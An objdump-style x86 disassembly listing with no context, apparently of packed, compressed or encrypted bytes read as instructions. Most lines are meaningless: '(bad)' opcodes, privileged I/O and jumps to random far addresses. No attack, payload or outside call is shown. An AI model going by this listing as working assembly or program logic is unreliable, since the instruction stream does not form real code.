  41e78c:	aaa    
  41e78d:	outs   dx,DWORD PTR ds:[esi]
  41e78e:	push   es
  41e78f:	push   ds
  41e790:	mov    fs,WORD PTR [ebp-0x33b8ad48]
  41e796:	(bad)  
  41e797:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e798:	dec    ebp
  41e799:	or     edi,DWORD PTR [esp+eax*4-0x10ec9438]
  41e7a0:	xor    dh,BYTE PTR [ecx+0x6c]
  41e7a3:	xchg   BYTE PTR [ecx-0x5099a5d5],dh
  41e7a9:	push   esp
  41e7aa:	push   edi
  41e7ab:	mov    ds:0x790dee69,al
  41e7b0:	dec    esp
  41e7b1:	ret    0x3757
  41e7b4:	in     al,0x19
  41e7b6:	mov    ebp,0xa0965964
  41e7bb:	dec    ecx
  41e7bc:	jmp    0x6026e1f7
  41e7c1:	push   ss
  41e7c2:	fcom   QWORD PTR ds:0x6030dd04
  41e7c8:	jnp    0x41e766
  41e7ca:	cwde   
  41e7cb:	xchg   ecx,eax
  41e7cc:	mov    ah,0xbc
  41e7ce:	jl     0x41e793
  41e7d0:	and    al,ch
  41e7d2:	inc    eax
  41e7d3:	bound  esp,QWORD PTR [edi]
  41e7d5:	dec    edi
  41e7d6:	lock push edi
  41e7d8:	call   FWORD PTR [edi-0x18b5c64]
  41e7de:	inc    ecx
  41e7df:	fcom   st(7)
  41e7e1:	stos   BYTE PTR es:[edi],al
  41e7e2:	sbb    eax,0x52a3e91e
  41e7e7:	inc    eax
  41e7e8:	fcmovu st,st(1)
  41e7ea:	stos   BYTE PTR es:[edi],al
  41e7eb:	loopne 0x41e811
  41e7ed:	mov    WORD PTR [edx-0x1ce4293f],es
  41e7f3:	in     eax,0xd8
  41e7f5:	leave  
  41e7f6:	aad    0x69
  41e7f8:	mov    esi,0x9b971dd4
  41e7fd:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41e7ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e800:	in     al,0xa0
  41e802:	popa   
  41e803:	fcom   DWORD PTR [edx-0x1c]
  41e806:	ret    
  41e807:	stc    
  41e808:	pmulhuw mm7,QWORD PTR [eax+0x46]
  41e80c:	sub    ah,ah
  41e80e:	or     esp,DWORD PTR [ecx+0x211e75ea]
  41e814:	data16 outs dx,BYTE PTR ds:[esi]
  41e816:	adc    esp,esi
  41e818:	mov    DWORD PTR [edx-0xd383178],ecx
  41e81e:	cdq    
  41e81f:	arpl   WORD PTR [edi-0x5],dx
  41e822:	mov    bl,0xd8
  41e824:	ds js  0x41e820
  41e827:	mov    ebx,?
  41e829:	cli    
  41e82a:	das    
  41e82b:	sahf   
  41e82c:	xlat   BYTE PTR ds:[ebx]
  41e82d:	icebp  
  41e82e:	jg     0x41e8af
  41e830:	imul   edi,eax,0x8e35c0f8
  41e836:	(bad)  
  41e837:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e838:	lods   eax,DWORD PTR ds:[esi]
  41e839:	rol    BYTE PTR [ecx],1
  41e83b:	sahf   
  41e83c:	mov    edx,0xaee895ab
  41e841:	sbb    edx,esp
  41e843:	loop   0x41e859
  41e845:	cmp    dh,bh
  41e847:	shl    al,0x7d
  41e84a:	cmp    DWORD PTR [edi-0x3b],0x342d0759
  41e851:	inc    ebp
  41e852:	mov    esp,DWORD PTR [edi-0x1d]
  41e855:	out    0xd5,eax
  41e857:	popa   
  41e858:	fs mov bh,0xf3
  41e85b:	shl    DWORD PTR [ecx*1+0xc5382a5],cl
  41e862:	cwde   
  41e863:	dec    ebp
  41e864:	pop    ebp
  41e865:	dec    ebp
  41e866:	or     BYTE PTR [ecx-0x79],0xcf
  41e86a:	jle    0x41e803
  41e86c:	aam    0xd
  41e86e:	test   DWORD PTR [ecx],edx
  41e870:	jno    0x41e86b
  41e872:	xor    al,0x98
  41e874:	lds    ebx,FWORD PTR [esp+eax*4]
  41e877:	ficomp WORD PTR [ecx+0x5833a4d]
  41e87d:	pop    ds
  41e87e:	iret   
  41e87f:	fsub   QWORD PTR ds:0xece49e48
  41e885:	jae    0x41e85a
  41e887:	mov    ebp,0xa3713108
  41e88c:	mov    bl,0xe5
  41e88e:	jno    0x41e871
  41e890:	mov    edi,0x624ce7db
  41e895:	mov    esi,0x9654272a
  41e89a:	rol    BYTE PTR [ebx-0x58],1
  41e89d:	sbb    BYTE PTR [edi-0x3d2fced1],al
  41e8a3:	addr16 mov esi,0xe4321322
  41e8a9:	xlat   BYTE PTR ds:[ebx]
  41e8aa:	es sub al,0x3a
  41e8ad:	mov    dh,0xef
  41e8af:	std    
  41e8b0:	or     BYTE PTR [eax+ebp*4-0x49],al
  41e8b4:	inc    edi
  41e8b5:	xchg   ebx,eax
  41e8b6:	pop    esp
  41e8b7:	mov    ebx,0x332f570
  41e8bc:	sbb    DWORD PTR [eax],ebx
  41e8be:	scas   al,BYTE PTR es:[edi]
  41e8bf:	sub    eax,DWORD PTR [eax-0x5091d3dd]
  41e8c5:	clc    
  41e8c6:	loop   0x41e84d
  41e8c8:	aas    
  41e8c9:	and    al,0x5c
  41e8cb:	in     eax,0x30
  41e8cd:	je     0x41e883
  41e8cf:	dec    edx
  41e8d0:	pusha  
  41e8d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8d2:	je     0x41e8c7
  41e8d4:	cmp    DWORD PTR [ebp+0x53774cfe],edi
  41e8da:	push   cs
  41e8db:	stos   DWORD PTR es:[edi],eax
  41e8dc:	shl    BYTE PTR [ebx],1
  41e8de:	inc    ecx
  41e8df:	adc    al,0xdc
  41e8e1:	fcom   DWORD PTR [ecx]
  41e8e3:	dec    esp
  41e8e4:	push   edx
  41e8e5:	inc    eax
  41e8e6:	add    al,0x5f
  41e8e8:	mov    eax,ds:0x96cc59fc
  41e8ed:	mov    al,ds:0xf6dc7f5e
  41e8f2:	(bad)  
  41e8f3:	cmp    ah,dh
  41e8f5:	out    0x5d,al
  41e8f7:	loope  0x41e93c
  41e8f9:	scas   eax,DWORD PTR es:[edi]
  41e8fa:	mov    eax,ds:0xa15634fb
  41e8ff:	push   eax
  41e900:	and    DWORD PTR [esi],esp
  41e902:	jmp    0xc2d5afa
  41e907:	mov    ebp,0x14805d85
  41e90c:	lods   al,BYTE PTR ds:[esi]
  41e90d:	das    
  41e90e:	int    0x16
  41e910:	test   dl,ch
  41e912:	mov    dl,0x80
  41e914:	xchg   DWORD PTR [eax+0x128e489f],esp
  41e91a:	scas   al,BYTE PTR es:[edi]
  41e91b:	test   al,0xaf
  41e91d:	dec    eax
  41e91e:	rdtsc  
  41e920:	inc    ebp
  41e921:	add    al,0x94
  41e923:	add    eax,0xffffffb3
  41e926:	mov    gs,WORD PTR [eax]
  41e928:	test   DWORD PTR [ebx+0x3712f3f4],edx
  41e92e:	enter  0x94cb,0xde
  41e932:	lea    ecx,[edi-0x2f]
  41e935:	xor    esp,edx
  41e937:	xchg   ebx,eax
  41e938:	fwait
  41e939:	xchg   esi,eax
  41e93a:	push   cs
  41e93b:	aas    
  41e93c:	pop    es
  41e93d:	leave  
  41e93e:	and    al,0x13
  41e940:	stos   DWORD PTR es:[edi],eax
  41e941:	arpl   WORD PTR [ebx-0x1e],bx
  41e944:	(bad)  
  41e945:	div    BYTE PTR [ecx-0x632b763]
  41e94b:	int3   
  41e94c:	scas   eax,DWORD PTR es:[edi]
  41e94d:	add    al,0xe0
  41e94f:	adc    bh,BYTE PTR [eax+0x35]
  41e952:	push   ss
  41e953:	(bad)  
  41e954:	(bad)  
  41e955:	jne    0x41e99b
  41e957:	jmp    0xf8b6:0x6481592e
  41e95e:	in     al,dx
  41e95f:	mov    eax,0xb914e049
  41e964:	sbb    ebp,DWORD PTR [ecx-0x3e04f893]
  41e96a:	je     0x41e98b
  41e96c:	adc    ecx,DWORD PTR [edi+0x3ad463db]
  41e972:	lods   eax,DWORD PTR ds:[esi]
  41e973:	shl    BYTE PTR [eax-0x10],cl
  41e976:	pop    ss
  41e977:	add    ah,BYTE PTR [esi]
  41e979:	and    edx,DWORD PTR [edx]
  41e97b:	data16 ins BYTE PTR es:[edi],dx
  41e97d:	jmp    0x41e99e
  41e97f:	dec    esp
  41e980:	xor    DWORD PTR [ecx-0x46],edx
  41e983:	sbb    ecx,DWORD PTR [edi-0x69e4e3cd]
  41e989:	add    ebx,DWORD PTR [edx-0x34d2bec8]
  41e98f:	push   ebx
  41e990:	imul   edi,esi,0x32
  41e993:	rcr    dh,1
  41e995:	pop    ds
  41e996:	push   es
  41e997:	fistp  DWORD PTR [ebx+0x451a91af]
  41e99d:	(bad)  
  41e99e:	cli    
  41e99f:	je     0x41ea0a
  41e9a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9a2:	or     eax,0xf6fcbfae
  41e9a7:	or     BYTE PTR [esi+0x1e],bl
  41e9aa:	lods   eax,DWORD PTR ds:[esi]
  41e9ab:	lea    edi,[eax+0x72887283]
  41e9b1:	aad    0x43
  41e9b3:	sub    al,0x2c
  41e9b5:	cmp    bh,BYTE PTR [edx+0x60e39021]
  41e9bb:	pop    ebp
  41e9bc:	cs jb  0x41ea12
  41e9bf:	push   es
  41e9c0:	xchg   edx,eax
  41e9c1:	ja     0x41e9a5
  41e9c3:	dec    ebp
  41e9c4:	popa   
  41e9c5:	jmp    0x7824d1d2
  41e9ca:	neg    BYTE PTR [edi]
  41e9cc:	add    DWORD PTR [edi+eax*2-0x57],esp
  41e9d0:	ins    DWORD PTR es:[edi],dx
  41e9d1:	jg     0x41e9d6
  41e9d3:	fwait
  41e9d4:	mov    cl,0xe6
  41e9d6:	mov    ds:0xab233646,eax
  41e9db:	fst    QWORD PTR [eax+0x6a4a7c08]
  41e9e1:	out    0x15,al
  41e9e3:	xor    DWORD PTR [edx+0x76d126b4],ebp
  41e9e9:	xor    al,0xca
  41e9eb:	xchg   esp,eax
  41e9ec:	je     0x41ea41
  41e9ee:	aas    
  41e9ef:	jmp    0x39f5:0x645707cb
  41e9f6:	clc    
  41e9f7:	int3   
  41e9f8:	ja     0x41e9ec
  41e9fa:	mov    BYTE PTR ds:0xf8fb5ab3,bh
  41ea00:	lods   eax,DWORD PTR ds:[esi]
  41ea01:	mov    dh,bh
  41ea03:	loop   0x41e98f
  41ea05:	mov    edx,DWORD PTR [ebp+0x1c]
  41ea08:	add    al,0x94
  41ea0a:	mov    ebp,0x6c089b92
  41ea0f:	int3   
  41ea10:	mov    dl,0x1d
  41ea12:	or     al,0xd7
  41ea14:	(bad)
  41ea18:	cmp    ebp,edx
  41ea1a:	or     eax,0x556c8e07
  41ea1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea20:	cs sub ch,dh
  41ea23:	pop    ss
  41ea24:	push   cs
  41ea25:	xchg   esi,eax
  41ea26:	fnsave [eax+edx*1]
  41ea29:	sbb    DWORD PTR [edx-0x7423cfa4],esi
  41ea2f:	or     BYTE PTR [ecx+eiz*2+0x71e55315],bh
  41ea36:	ss inc esi
  41ea38:	leave  
  41ea39:	mov    eax,DWORD PTR [edi]
  41ea3b:	out    0xc9,eax
  41ea3d:	jmp    0x41eab9
  41ea3f:	adc    ah,dl
  41ea41:	gs call 0x5762fcb7
  41ea47:	mov    ebp,0xb999f606
  41ea4c:	jp     0x41eab5
  41ea4e:	sahf   
  41ea4f:	in     al,dx
  41ea50:	fdivr  DWORD PTR [ebp-0x77f0b547]
  41ea56:	je     0x41ead4
  41ea58:	add    esi,DWORD PTR [esi]
  41ea5a:	std    
  41ea5b:	(bad)  
  41ea5c:	push   cs
  41ea5d:	mov    edx,0x44d95f38
  41ea62:	jmp    0xc4754a4c
  41ea67:	scas   al,BYTE PTR es:[edi]
  41ea68:	dec    ebp
  41ea69:	jmp    0xb7c1e2f0
  41ea6e:	jg     0x41ea9e
  41ea70:	cmp    DWORD PTR [edi+0x22646668],edi
  41ea76:	and    DWORD PTR [edi+ecx*2+0x56a14ee4],edx
  41ea7d:	xchg   ebp,eax
  41ea7e:	cmp    eax,0x2593e63e
  41ea83:	popa   
  41ea84:	sub    ch,BYTE PTR [ecx+eax*1+0x6b]
  41ea88:	mov    dh,0x4a
  41ea8a:	inc    eax
  41ea8b:	xchg   ecx,eax
  41ea8c:	sbb    DWORD PTR [eax+ebx*1+0x61],ebp
  41ea90:	fucomip st,st(1)
  41ea92:	mov    ebp,0x4794998
  41ea97:	cmp    dl,ah
  41ea99:	fld    TBYTE PTR [eax-0x75]
  41ea9c:	es add esi,ebp
  41ea9f:	dec    esi
  41eaa0:	pushf  
  41eaa1:	push   ebx
  41eaa2:	and    dl,BYTE PTR fs:[edi-0x77beddf5]
  41eaa9:	push   eax
  41eaaa:	xor    ebx,esp
  41eaac:	jno    0x41ead2
  41eaae:	(bad)  
  41eaaf:	push   esi
  41eab0:	inc    ecx
  41eab1:	xchg   ebp,eax
  41eab2:	or     eax,0x87f96456
  41eab7:	int    0x37
  41eab9:	arpl   bp,ax
  41eabb:	add    al,0x5a
  41eabd:	xchg   esi,eax
  41eabe:	mov    ch,0x40
  41eac0:	loope  0x41eaa2
  41eac2:	imul   ecx,DWORD PTR [esi],0x2c40965a
  41eac8:	mov    ds:0xf001ad03,eax
  41eacd:	and    eax,0xffffffa1
  41ead0:	cli    
  41ead1:	fild   DWORD PTR [edi]
  41ead3:	repz cmp cl,al
  41ead6:	jae    0x41eab0
  41ead8:	or     ebx,ecx
  41eada:	mov    BYTE PTR [eax+0x31],dh
  41eadd:	mov    eax,0x2ec86373
  41eae2:	xchg   ebx,eax
  41eae3:	push   esi
  41eae4:	add    dl,bh
  41eae6:	cmp    eax,0x3163f3d8
  41eaeb:	fmulp  st(4),st
  41eaed:	jb     0x41eac0
  41eaef:	imul   ecx,ebp,0xffffffc9
  41eaf2:	ins    DWORD PTR es:[edi],dx
  41eaf3:	mov    dh,0xf5
  41eaf5:	lea    ebx,[edx-0x17]
  41eaf8:	pusha  
  41eaf9:	sub    eax,0xb24aeb86
  41eafe:	outs   dx,DWORD PTR ds:[esi]
  41eaff:	xor    esi,DWORD PTR [edx]
  41eb01:	pushf  
  41eb02:	ins    DWORD PTR es:[edi],dx
  41eb03:	call   0xf059:0xef904eed
  41eb0a:	jns    0x41eb87
  41eb0c:	adc    bh,al
  41eb0e:	fisttp QWORD PTR [eax-0x47]
  41eb11:	repnz shr BYTE PTR [eax-0x1a65db6a],1
  41eb18:	adc    ah,BYTE PTR [edx]
  41eb1a:	loopne 0x41eaa4
  41eb1c:	pop    esi
  41eb1d:	sahf   
  41eb1e:	stos   DWORD PTR es:[edi],eax
  41eb1f:	push   ebx
  41eb20:	jge    0x41eb38
  41eb22:	and    ebx,edi
  41eb24:	ficom  WORD PTR [ebp+edx*8+0x6486eeeb]
  41eb2b:	or     DWORD PTR [edx-0x68234a44],edx
  41eb31:	add    BYTE PTR [ecx+0x2e],0x37
  41eb35:	or     al,BYTE PTR [eax+0x777cc09]
  41eb3b:	add    bh,ch
  41eb3d:	outs   dx,BYTE PTR ds:[esi]
  41eb3e:	icebp  
  41eb3f:	jne    0x41eb38
  41eb41:	sar    DWORD PTR cs:[edi+0x24],1
  41eb45:	xor    ah,BYTE PTR [ebx+ebx*1-0x53efd9e7]
  41eb4c:	inc    esp
  41eb4d:	jle    0x41eaf5
  41eb4f:	push   ebp
  41eb50:	mov    al,ds:0xd9170987
  41eb55:	stos   BYTE PTR es:[edi],al
  41eb56:	inc    esp
  41eb57:	jne    0x41ebd8
  41eb59:	aaa    
  41eb5a:	in     eax,dx
  41eb5b:	push   esp
  41eb5c:	mov    ds:0xb9dddf94,al
  41eb61:	loop   0x41eb61
  41eb63:	test   eax,0x2e081353
  41eb68:	pushf  
  41eb69:	sbb    DWORD PTR [eax],ebx
  41eb6b:	or     DWORD PTR [eax+ebx*1+0x36f85562],ebx
  41eb72:	jl     0x41eb78
  41eb74:	fisub  WORD PTR [ecx-0x24]
  41eb77:	and    DWORD PTR ds:0x6dd866,ebp
  41eb7d:	shl    DWORD PTR [edx],0x1d
  41eb80:	pop    ss
  41eb81:	call   0x8e4b:0xe48d5e17
  41eb88:	adc    ebx,DWORD PTR [ebx-0x3c]
  41eb8b:	adc    al,0x71
  41eb8d:	mul    BYTE PTR [ecx]
  41eb8f:	add    eax,0xdfd93fae
  41eb94:	sti    
  41eb95:	shr    al,cl
  41eb97:	jne    0x41ebdf
  41eb99:	cmp    dh,dl
  41eb9b:	push   cs
  41eb9c:	fcmovnbe st,st(1)
  41eb9e:	mov    bh,0x2b
  41eba0:	inc    ecx
  41eba1:	shr    BYTE PTR [ebx],1
  41eba3:	leave  
  41eba4:	call   FWORD PTR [ecx+0x70210a7e]
  41ebaa:	mov    edx,0xe75c6d1d
  41ebaf:	sub    esp,DWORD PTR [edi+0x15]
  41ebb2:	outs   dx,DWORD PTR ds:[esi]
  41ebb3:	cmp    al,0x73
  41ebb5:	ret    
  41ebb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebb7:	mov    ?,WORD PTR [edx]
  41ebb9:	nop
  41ebba:	jge    0x41ec30
  41ebbc:	mov    esi,0x78ae6357
  41ebc1:	stos   BYTE PTR es:[edi],al
  41ebc2:	xor    esi,ecx
  41ebc4:	mov    eax,ds:0x210e32d6
  41ebc9:	xlat   BYTE PTR ds:[ebx]
  41ebca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebcb:	ins    BYTE PTR es:[edi],dx
  41ebcc:	jmp    0x18efff5c
  41ebd1:	pop    eax
  41ebd2:	push   ebx
  41ebd3:	fwait
  41ebd4:	lods   al,BYTE PTR cs:[esi]
  41ebd6:	pop    ss
  41ebd7:	sub    esi,esp
  41ebd9:	push   edi
  41ebda:	jl     0x41ebaa
  41ebdc:	jmp    0x41ebb2
  41ebde:	and    eax,0x20332b8c
  41ebe3:	div    BYTE PTR [edi]
  41ebe5:	mov    ch,0xe0
  41ebe7:	and    eax,DWORD PTR [eax]
  41ebe9:	dec    esi
  41ebea:	mov    ebx,0xfba1fafa
  41ebef:	bound  ebx,QWORD PTR [ebx-0x779aa80c]
  41ebf5:	fidiv  WORD PTR [ebx+0x1e1d0857]
  41ebfb:	jmp    0x89801441
  41ec00:	push   ebx
  41ec01:	int    0xc2
  41ec03:	jnp    0x41eb8f
  41ec05:	pop    ds
  41ec06:	pop    ss
  41ec07:	out    0x2a,eax
  41ec09:	dec    esi
  41ec0a:	dec    esi
  41ec0b:	out    0x63,al
  41ec0d:	dec    esi
  41ec0e:	jge    0x41ec53
  41ec10:	pop    ss
  41ec11:	push   edi
  41ec12:	aam    0x10
  41ec14:	cmp    eax,DWORD PTR [edx+0x4c24c41c]
  41ec1a:	je     0x41ebd6
  41ec1c:	pop    ds
  41ec1d:	fld    DWORD PTR [eax-0x28f68d57]
  41ec23:	sub    DWORD PTR [ecx-0x33],eax
  41ec26:	test   DWORD PTR [edx],esp
  41ec28:	sub    cl,BYTE PTR [edx+0xb62d332]
  41ec2e:	fisubr WORD PTR [edi]
  41ec30:	inc    ebx
  41ec31:	xchg   esi,eax
  41ec32:	pushf  
  41ec33:	xchg   BYTE PTR [edx+0x5a390ad8],ch
  41ec39:	mov    edx,0xf52acfc2
  41ec3e:	mov    ch,0x81
  41ec40:	sub    BYTE PTR [ebx],0x89
  41ec43:	sar    BYTE PTR [ebx+0x2be15b19],1
  41ec49:	add    BYTE PTR [edx+0x634ba556],ah
  41ec4f:	dec    ecx
  41ec50:	pop    edi
  41ec51:	sar    BYTE PTR [edi+0x72],1
  41ec54:	and    al,0x13
  41ec56:	stc    
  41ec57:	xor    eax,0x2a57a0b2
  41ec5c:	int    0xab
  41ec5e:	xor    BYTE PTR [eax*4-0x27dfc906],dl
  41ec65:	stos   BYTE PTR es:[edi],al
  41ec66:	neg    DWORD PTR [esi]
  41ec68:	stos   DWORD PTR es:[edi],eax
  41ec69:	and    edx,esp
  41ec6b:	push   esp
  41ec6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec6d:	aaa    
  41ec6e:	inc    ebx
  41ec6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec70:	pop    ds
  41ec71:	ret    
  41ec72:	sbb    DWORD PTR [edi-0xaa135b5],ecx
  41ec78:	inc    eax
  41ec79:	push   cs
  41ec7a:	sub    ch,BYTE PTR [ecx]
  41ec7c:	in     eax,0xa1
  41ec7e:	loopne 0x41ec12
  41ec80:	(bad)  
  41ec81:	daa    
  41ec82:	mov    eax,ds:0xe5f191bb
  41ec87:	sub    edi,DWORD PTR [ecx-0xaf7ce14]
  41ec8d:	dec    eax
  41ec8e:	sub    DWORD PTR [edi-0x3b],ebx
  41ec91:	dec    eax
  41ec92:	and    eax,0xa5959c9e
  41ec97:	dec    eax
  41ec98:	inc    ecx
  41ec99:	add    ecx,DWORD PTR es:[ebp-0xb]
  41ec9d:	mov    bl,0xb5
  41ec9f:	or     ch,BYTE PTR [eax-0x6499f588]
  41eca5:	pop    ecx
  41eca6:	out    dx,al
  41eca7:	mov    ch,0xbd
  41eca9:	popa   
  41ecaa:	je     0x41ecd1
  41ecac:	mov    edx,0xd1984e87
  41ecb1:	ret    0x23a1
  41ecb4:	xchg   ebp,eax
  41ecb5:	inc    edx
  41ecb6:	sbb    eax,0xbfa5f034
  41ecbb:	cmp    DWORD PTR [edi+0x1e],ebx
  41ecbe:	aad    0x87
  41ecc0:	shl    bl,0x84
  41ecc3:	neg    BYTE PTR [esi-0x75]
  41ecc6:	jecxz  0x41ec4c
  41ecc8:	cmp    DWORD PTR [ecx+0x44001821],ebx
  41ecce:	pop    eax
  41eccf:	inc    ecx
  41ecd0:	cmp    cl,bl
  41ecd2:	jae    0x41ed35
  41ecd4:	popf   
  41ecd5:	test   BYTE PTR [eax+ebx*8],bl
  41ecd8:	pop    ebx
  41ecd9:	lock pop ecx
  41ecdb:	sub    DWORD PTR [edi],esp
  41ecdd:	shl    DWORD PTR [ebp-0x40],0xa4
  41ece1:	js     0x41ecfe
  41ece3:	aaa    
  41ece4:	mov    eax,ds:0x81cc36a0
  41ece9:	push   ds
  41ecea:	fisub  DWORD PTR [esi+0x3be0f49c]
  41ecf0:	inc    ebp
  41ecf1:	in     eax,dx
  41ecf2:	mov    dl,0x23
  41ecf4:	mov    BYTE PTR [esi+0x293e5e3e],0xf0
  41ecfb:	nop
  41ecfc:	into   
  41ecfd:	mov    eax,0xa74e4876
  41ed02:	adc    cl,ah
  41ed04:	jp     0x41ec99
  41ed06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed07:	das    
  41ed08:	ds cli 
  41ed0a:	sgdtd  [edi+0x7]
  41ed0e:	(bad)  
  41ed0f:	xor    BYTE PTR [edx-0x2023bb90],ah
  41ed15:	std    
  41ed16:	jle    0x41ec99
  41ed18:	aas    
  41ed19:	outs   dx,BYTE PTR ds:[esi]
  41ed1a:	cmc    
  41ed1b:	out    0x99,al
  41ed1d:	mov    al,0x94
  41ed1f:	int    0x45
  41ed21:	pop    ds
  41ed22:	mov    bh,0x91
  41ed24:	mov    ds:0xa65f30e2,al
  41ed29:	pushf  
  41ed2a:	push   eax
  41ed2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed2c:	iret   
  41ed2d:	fstp   DWORD PTR [edi]
  41ed2f:	aaa    
  41ed30:	lea    ebx,[esi+0x18]
  41ed33:	xchg   edx,eax
  41ed34:	dec    esi
  41ed35:	(bad)  
  41ed37:	cmp    BYTE PTR [edx],cl
  41ed39:	add    BYTE PTR [ebp-0x9],cl
  41ed3c:	inc    edx
  41ed3d:	mov    ah,0x1c
  41ed3f:	ja     0x41ecd1
  41ed41:	push   cs
  41ed42:	mov    edx,0xbc660d64
  41ed47:	dec    eax
  41ed48:	add    ecx,DWORD PTR [edx+ebp*4-0x24c28086]
  41ed4f:	sub    ebx,esi
  41ed51:	outs   dx,BYTE PTR ds:[esi]
  41ed52:	xchg   ebp,eax
  41ed53:	icebp  
  41ed54:	xor    esi,edx
  41ed56:	adc    al,0x67
  41ed58:	jne    0x41ecee
  41ed5a:	rsqrtps xmm4,XMMWORD PTR [eax-0x70]
  41ed5e:	and    eax,0x4fce85ef
  41ed63:	dec    edx
  41ed64:	cwde   
  41ed65:	in     eax,0x22
  41ed67:	xchg   ebp,eax
  41ed68:	sbb    al,bh
  41ed6a:	mov    ds:0x5c64d4cf,eax
  41ed6f:	outs   dx,DWORD PTR ds:[esi]
  41ed70:	mov    dl,0xb
  41ed72:	mov    esp,0x45dca585
  41ed77:	mov    ebx,0xf188156b
  41ed7c:	inc    esp
  41ed7d:	repz jmp 0xf60e:0x6736a7de
  41ed85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed86:	cdq    
  41ed87:	xchg   edi,eax
  41ed88:	inc    esi
  41ed89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed8a:	ja     0x41ed37
  41ed8c:	jl     0x41ed10
  41ed8e:	retf   
  41ed8f:	mov    ch,BYTE PTR [edx-0x7c]
  41ed92:	mov    esi,0x8374a040
  41ed97:	sub    eax,0xe055d66c
  41ed9c:	ret    
  41ed9d:	sub    DWORD PTR [esi+0x32ee8a44],edi
  41eda3:	or     esi,0xfa8ec759
  41eda9:	push   ebp
  41edaa:	sbb    esi,esp
  41edac:	inc    edx
  41edad:	mov    esp,DWORD PTR [eax-0x42]
  41edb0:	dec    ebx
  41edb1:	and    eax,0x21917410
  41edb6:	jmp    0x25761f59
  41edbb:	and    edi,DWORD PTR [ecx]
  41edbd:	cmp    al,0x99
  41edbf:	adc    ah,BYTE PTR [ebp-0x7c]
  41edc2:	ret    
  41edc3:	add    al,0x6f
  41edc5:	jno    0x41ee03
  41edc7:	ins    DWORD PTR es:[edi],dx
  41edc8:	sbb    esp,DWORD PTR [esi]
  41edca:	mov    edi,0xdcba7ca9
  41edcf:	and    BYTE PTR [eax+0x11],al
  41edd2:	pusha  
  41edd3:	xchg   edi,eax
  41edd4:	mov    dh,0x46
  41edd6:	(bad)  
  41edd7:	neg    ebp
  41edd9:	and    eax,0x161811f4
  41edde:	mov    esp,0x16fdd153
  41ede3:	test   eax,0x10415098
  41ede8:	fisttp QWORD PTR [ebp-0x6ff9ae6]
  41edee:	outs   dx,DWORD PTR ds:[esi]
  41edef:	cs (bad) 
  41edf1:	mov    al,0x36
  41edf3:	mov    al,ds:0xb4f1f35
  41edf8:	mov    gs,WORD PTR [ebx-0x437cbf07]
  41edfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edff:	jg     0x41ede2
  41ee01:	cmp    DWORD PTR [ebp-0x9e6bfa6],esi
  41ee07:	adc    ebp,esi
  41ee09:	dec    ebp
  41ee0a:	or     al,al
  41ee0c:	fs cmp ebp,esi
  41ee0f:	cs mov esp,0x67d051e7
  41ee15:	add    eax,0x4d7357c2
  41ee1a:	add    BYTE PTR es:[ecx],dh
  41ee1d:	aad    0x1a
  41ee1f:	sahf   
  41ee20:	mov    al,ds:0xe76a6a0a
  41ee25:	sbb    eax,0x70650915
  41ee2a:	inc    esp
  41ee2b:	icebp  
  41ee2c:	push   ss
  41ee2d:	lahf   
  41ee2e:	cmp    BYTE PTR [eax+0x15],al
  41ee31:	in     al,0xae
  41ee33:	inc    eax
  41ee34:	callw  0xc32
  41ee38:	jnp    0x41ee60
  41ee3a:	iret   
  41ee3b:	lds    ebp,FWORD PTR [edi+0x41e95018]
  41ee41:	and    ecx,DWORD PTR [ebx+0x3a0fe948]
  41ee47:	inc    edi
  41ee48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee49:	out    dx,al
  41ee4a:	or     DWORD PTR [esi],0xffffff8f
  41ee4d:	call   0xeea8aaff
  41ee52:	dec    ebp
  41ee53:	jecxz  0x41eeb3
  41ee55:	cmp    DWORD PTR [esi],esp
  41ee57:	dec    esi
  41ee58:	cmp    ebx,DWORD PTR [esi-0x33]
  41ee5b:	in     al,dx
  41ee5c:	lods   al,BYTE PTR ds:[esi]
  41ee5d:	inc    ebp
  41ee5e:	div    DWORD PTR [eax-0x1244d7c8]
  41ee64:	ret    0x6ea
  41ee67:	mov    ebp,0xd273d652
  41ee6c:	stos   BYTE PTR es:[edi],al
  41ee6d:	xchg   esi,eax
  41ee6e:	(bad)  
  41ee6f:	cmp    al,dl
  41ee71:	scas   eax,DWORD PTR es:[edi]
  41ee72:	les    eax,FWORD PTR [eax-0x34a3dbb2]
  41ee78:	cld    
  41ee79:	cmp    dh,dh
  41ee7b:	mov    ?,WORD PTR [ecx+ecx*2]
  41ee7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee7f:	lods   eax,DWORD PTR ds:[esi]
  41ee80:	lods   al,BYTE PTR ds:[esi]
  41ee81:	mov    dl,0x78
  41ee83:	cmp    al,0x76
  41ee85:	pop    edi
  41ee86:	data16 js 0x41eee1
  41ee89:	ret    
  41ee8a:	push   esp
  41ee8b:	xchg   bh,al
  41ee8d:	hlt    
  41ee8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee8f:	mov    ecx,0x28a58a75
  41ee94:	in     al,dx
  41ee95:	jle    0x41ef0b
  41ee97:	lahf   
  41ee98:	rcl    ch,cl
  41ee9a:	and    ecx,edi
  41ee9c:	xchg   BYTE PTR [edi-0x797cfb4c],bl
  41eea2:	jge    0x41ee47
  41eea4:	push   edi
  41eea5:	inc    ecx
  41eea6:	loopne 0x41eef2
  41eea8:	sbb    eax,0xcdf87234
  41eead:	xchg   edx,eax
  41eeae:	jno    0x41ee60
  41eeb0:	(bad)  
  41eeb1:	adc    al,0xee
  41eeb3:	aas    
  41eeb4:	sbb    ch,bl
  41eeb6:	aas    
